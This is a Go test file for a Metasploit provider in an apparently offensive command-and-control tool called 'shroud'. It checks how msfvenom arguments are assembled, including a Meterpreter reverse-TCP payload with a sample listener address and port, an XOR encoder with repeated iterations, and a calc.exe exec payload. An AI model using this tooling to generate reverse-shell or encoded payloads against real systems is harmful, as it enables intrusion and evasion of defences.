package metasploit

import (
	"testing"

	"shroud/internal/c2"

	"github.com/spf13/cobra"
	"github.com/spf13/pflag"
)

// newCmd builds a cobra.Command with the provider's flags set to the given values,
// so buildArgs/Preflight can read them.
func newCmd(t *testing.T, vals map[string]interface{}) *cobra.Command {
	t.Helper()
	c := &cobra.Command{}
	(provider{}).AddFlags(c.Flags())
	setFlags(t, c.Flags(), vals)
	return c
}

func setFlags(t *testing.T, fs *pflag.FlagSet, vals map[string]interface{}) {
	t.Helper()
	for k, v := range vals {
		switch x := v.(type) {
		case string:
			_ = fs.Set(k, x)
		case int:
			_ = fs.Set(k, intStr(x))
		}
	}
}

func intStr(n int) string {
	if n == 0 {
		return "0"
	}
	// fast itoa without importing strconv to keep deps minimal
	var b []byte
	neg := n < 0
	if neg {
		n = -n
	}
	for n > 0 {
		b = append([]byte{byte('0' + n%10)}, b...)
		n /= 10
	}
	if len(b) == 0 {
		return "0"
	}
	if neg {
		return "-" + string(b)
	}
	return string(b)
}

// TestBuildArgsBase verifies the core argv shape: -p payload -a arch -f format,
// with LHOST/LPORT injected only when set.
func TestBuildArgsBase(t *testing.T) {
	c := newCmd(t, map[string]interface{}{
		"msf-payload": "windows/x64/meterpreter/reverse_tcp",
		"msf-lhost":    "10.0.0.5",
		"msf-lport":    4444,
	})
	args, payload, err := buildArgs(c)
	if err != nil {
		t.Fatal(err)
	}
	if payload != "windows/x64/meterpreter/reverse_tcp" {
		t.Errorf("payload = %q", payload)
	}
	wantContains(t, args, "-p", "windows/x64/meterpreter/reverse_tcp", "-a", "x64", "-f", "raw", "LHOST=10.0.0.5", "LPORT=4444")
}

// TestBuildArgsEncoderIterations asserts -e and -i are added only when set.
func TestBuildArgsEncoderIterations(t *testing.T) {
	c := newCmd(t, map[string]interface{}{
		"msf-payload":     "windows/x64/exec",
		"msf-encoder":      "x64/xor_dynamic",
		"msf-iterations":   5,
		"msf-extra":        "CMD=calc.exe EXITFUNC=thread",
	})
	args, _, err := buildArgs(c)
	if err != nil {
		t.Fatal(err)
	}
	wantContains(t, args, "-e", "x64/xor_dynamic", "-i", "5", "CMD=calc.exe", "EXITFUNC=thread")
}

// TestBuildArgsNoLhostLport confirms LHOST/LPORT are omitted when zero/empty
// (so bind payloads don't error on unrecognized options).
func TestBuildArgsNoLhostLport(t *testing.T) {
	c := newCmd(t, map[string]interface{}{
		"msf-payload": "windows/x64/exec",
	})
	args, _, err := buildArgs(c)
	if err != nil {
		t.Fatal(err)
	}
	for _, a := range args {
		if len(a) >= 5 && (a[:5] == "LHOST" || a[:5] == "LPORT") {
			t.Errorf("unexpected %q in args", a)
		}
	}
}

// TestBuildArgsMissingPayload confirms buildArgs errors when --msf-payload is unset.
func TestBuildArgsMissingPayload(t *testing.T) {
	c := newCmd(t, nil)
	if _, _, err := buildArgs(c); err == nil {
		t.Error("expected error when --msf-payload is unset")
	}
}

// TestPreflightMissingPayload confirms Preflight errors when --msf-payload is
// unset (even if msfvenom is on PATH, which it may or may not be in CI).
func TestPreflightMissingPayload(t *testing.T) {
	c := newCmd(t, nil)
	err := (provider{}).Preflight(c)
	if err == nil {
		// msfvenom absent would also error; either way a nil error is wrong here
		// because the payload is unset — guard against a false pass.
		t.Error("expected error when --msf-payload is unset")
	}
}

// TestProviderRegistered confirms init() registered the provider under "metasploit".
func TestProviderRegistered(t *testing.T) {
	p, err := c2.Resolve("metasploit")
	if err != nil {
		t.Fatal(err)
	}
	if p.Name() != "metasploit" {
		t.Errorf("registered name = %q, want metasploit", p.Name())
	}
}

func wantContains(t *testing.T, args []string, want ...string) {
	t.Helper()
	for _, w := range want {
		if !argsHas(args, w) {
			t.Errorf("args %v missing %q", args, w)
		}
	}
}

func argsHas(args []string, s string) bool {
	for _, a := range args {
		if a == s {
			return true
		}
	}
	return false
}